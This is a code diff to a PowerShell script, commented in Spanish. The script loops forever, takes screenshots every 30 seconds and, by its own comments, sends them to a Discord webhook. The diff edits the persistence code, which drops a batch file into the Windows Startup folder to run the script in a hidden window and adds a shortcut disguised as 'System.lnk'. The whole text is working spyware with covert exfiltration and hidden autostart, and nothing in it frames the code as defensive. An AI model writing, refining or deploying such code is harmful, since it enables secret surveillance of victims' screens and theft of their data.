@@ -16,7 +16,7 @@ if (-not (Test-Path -Path $scriptPath)) {
 # Script para capturar y enviar capturas de pantalla al webhook de Discord
 
 # Bucle principal: tomar dos capturas de pantalla cada 30 segundos
-While ($true){
+While (\$true){
     # Definir la ruta y el nombre de archivo para la captura de pantalla
     \$file1 = "\$env:temp\SC1.png"
     \$file2 = "\$env:temp\SC2.png"
@@ -58,24 +58,27 @@ While ($true){
     Set-Content -Path $scriptPath -Value $scriptContent
 }
 
-# Obtener la carpeta de inicio del usuario actual
-$startupFolder = [Environment]::GetFolderPath("Startup")
+# Verificar si el archivo de script descargado existe
+if (Test-Path -Path $scriptPath) {
+    # Obtener la carpeta de inicio del usuario actual
+    $startupFolder = [Environment]::GetFolderPath("Startup")
 
-# Ruta completa del archivo de lote en la carpeta de inicio
-$batFilePath = Join-Path -Path $startupFolder -ChildPath "run_script.bat"
+    # Ruta completa del archivo de lote en la carpeta de inicio
+    $batFilePath = Join-Path -Path $startupFolder -ChildPath "run_script.bat"
 
-# Contenido del archivo de lote para ejecutar el script de PowerShell de manera oculta
-$batContent = @"
+    # Contenido del archivo de lote para ejecutar el script de PowerShell de manera oculta
+    $batContent = @"
 @echo off
 powershell.exe -WindowStyle Hidden -File "$scriptPath"
 "@
 
-# Guardar el archivo de lote en la carpeta de inicio
-Set-Content -Path $batFilePath -Value $batContent
+    # Guardar el archivo de lote en la carpeta de inicio
+    Set-Content -Path $batFilePath -Value $batContent
 
-# Crear un acceso directo del archivo de lote en la carpeta de inicio para que se ejecute al iniciar Windows
-$shortcutPath = Join-Path -Path $startupFolder -ChildPath "System.lnk"
-$WScriptShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
-$Shortcut.TargetPath = $batFilePath
-$Shortcut.Save()
+    # Crear un acceso directo del archivo de lote en la carpeta de inicio para que se ejecute al iniciar Windows
+    $shortcutPath = Join-Path -Path $startupFolder -ChildPath "System.lnk"
+    $WScriptShell = New-Object -ComObject WScript.Shell
+    $Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+    $Shortcut.TargetPath = $batFilePath
+    $Shortcut.Save()
+}
